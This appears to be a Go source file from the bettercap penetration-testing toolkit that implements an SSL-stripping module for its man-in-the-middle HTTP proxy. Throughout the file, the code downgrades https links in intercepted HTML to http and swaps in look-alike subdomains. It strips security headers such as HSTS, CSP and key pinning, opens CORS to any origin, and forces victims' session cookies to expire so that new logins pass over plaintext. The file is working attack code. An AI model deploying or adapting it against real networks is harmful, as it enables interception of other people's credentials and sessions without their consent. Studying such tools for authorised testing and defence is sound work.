package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"sync"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"

	"github.com/elazarl/goproxy"
	"github.com/jpillora/go-tld"
)

var (
	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
	subdomains       = map[string]string{
		"www":     "wwwww",
		"webmail": "wwebmail",
		"mail":    "wmail",
		"m":       "wmobile",
	}
)

type cookieTracker struct {
	sync.RWMutex
	set map[string]bool
}

func NewCookieTracker() *cookieTracker {
	return &cookieTracker{
		set: make(map[string]bool),
	}
}

func (t *cookieTracker) domainOf(req *http.Request) string {
	if parsed, err := tld.Parse(req.Host); err != nil {
		log.Warning("Could not parse host %s: %s", req.Host, err)
		return req.Host
	} else {
		return parsed.Domain + "." + parsed.TLD
	}
}

func (t *cookieTracker) keyOf(req *http.Request) string {
	client := strings.Split(req.RemoteAddr, ":")[0]
	domain := t.domainOf(req)
	return fmt.Sprintf("%s-%s", client, domain)
}

func (t *cookieTracker) IsClean(req *http.Request) bool {
	t.RLock()
	defer t.RUnlock()

	// we only clean GET requests
	if req.Method != "GET" {
		return true
	}

	// does the request have any cookie?
	cookie := req.Header.Get("Cookie")
	if cookie == "" {
		return true
	}

	// was it already processed?
	if _, found := t.set[t.keyOf(req)]; found == true {
		return true
	}

	// unknown session cookie
	return false
}

func (t *cookieTracker) Track(req *http.Request) {
	t.Lock()
	defer t.Unlock()
	t.set[t.keyOf(req)] = true
}

func (t *cookieTracker) Expire(req *http.Request) *http.Response {
	domain := t.domainOf(req)
	redir := goproxy.NewResponse(req, "text/plain", 302, "")

	for _, c := range req.Cookies() {
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, domain))
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, c.Domain))
	}

	redir.Header.Add("Location", req.URL.String())
	redir.Header.Add("Connection", "close")

	return redir
}

type SSLStripper struct {
	Enabled bool
	cookies *cookieTracker
}

func NewSSLStripper(enabled bool) *SSLStripper {
	return &SSLStripper{
		Enabled: enabled,
		cookies: NewCookieTracker(),
	}
}

func (s *SSLStripper) stripRequestHeaders(req *http.Request) {
	req.Header.Del("Accept-Encoding")
	req.Header.Del("If-None-Match")
	req.Header.Del("If-Modified-Since")
	req.Header.Del("Upgrade-Insecure-Requests")

	req.Header.Set("Pragma", "no-cache")
}

func (s *SSLStripper) stripResponseHeaders(res *http.Response) {
	res.Header.Del("Content-Security-Policy-Report-Only")
	res.Header.Del("Content-Security-Policy")
	res.Header.Del("Strict-Transport-Security")
	res.Header.Del("Public-Key-Pins")
	res.Header.Del("Public-Key-Pins-Report-Only")
	res.Header.Del("X-Frame-Options")
	res.Header.Del("X-Content-Type-Options")
	res.Header.Del("X-WebKit-CSP")
	res.Header.Del("X-Content-Security-Policy")
	res.Header.Del("X-Download-Options")
	res.Header.Del("X-Permitted-Cross-Domain-Policies")
	res.Header.Del("X-Xss-Protection")

	res.Header.Set("Allow-Access-From-Same-Origin", "*")
	res.Header.Set("Access-Control-Allow-Origin", "*")
	res.Header.Set("Access-Control-Allow-Methods", "*")
	res.Header.Set("Access-Control-Allow-Headers", "*")
}

// sslstrip preprocessing, takes care of:
//
// - patching / removing security related headers
// - making unknown session cookies expire
// - handling stripped domains
func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
	if s.Enabled == false {
		return
	}

	// preprocess request headers
	s.stripRequestHeaders(req)

	// check if we need to redirect the user in order
	// to make unknown session cookies expire
	if s.cookies.IsClean(req) == false {
		log.Info("[%s] Sending expired cookies for %s to %s", core.Green("sslstrip"), core.Yellow(req.Host), req.RemoteAddr)
		s.cookies.Track(req)
		redir = s.cookies.Expire(req)
	}

	return
}

func (s *SSLStripper) isHTML(res *http.Response) bool {
	for name, values := range res.Header {
		for _, value := range values {
			if name == "Content-Type" {
				return strings.HasPrefix(value, "text/html")
			}
		}
	}

	return false
}

func (s *SSLStripper) processURL(url string) string {
	// first we remove the https schema
	url = strings.Replace(url, "https://", "http://", 1)

	// search for a known subdomain and replace it
	found := false
	for sub, repl := range subdomains {
		what := fmt.Sprintf("://%s", sub)
		with := fmt.Sprintf("://%s", repl)
		if strings.Contains(url, what) {
			url = strings.Replace(url, what, with, 1)
			found = true
			break
		}
	}
	// fallback
	if found == false {
		url = strings.Replace(url, "://", "://wwww.", 1)
	}

	return url
}

func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
	if s.Enabled == false {
		return
	} else if s.isHTML(res) == false {
		return
	}

	// process response headers
	// s.stripResponseHeaders(res)

	// fetch the HTML body
	raw, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Error("Could not read response body: %s", err)
		return
	}

	body := string(raw)
	urls := make(map[string]string, 0)
	matches := httpsLinksParser.FindAllString(body, -1)
	for _, url := range matches {
		urls[url] = s.processURL(url)
	}

	for url, stripped := range urls {
		log.Info("Stripping url %s to %s", core.Bold(url), core.Yellow(stripped))
		body = strings.Replace(body, url, stripped, -1)
	}

	// reset the response body to the original unread state
	res.Body = ioutil.NopCloser(strings.NewReader(body))
}
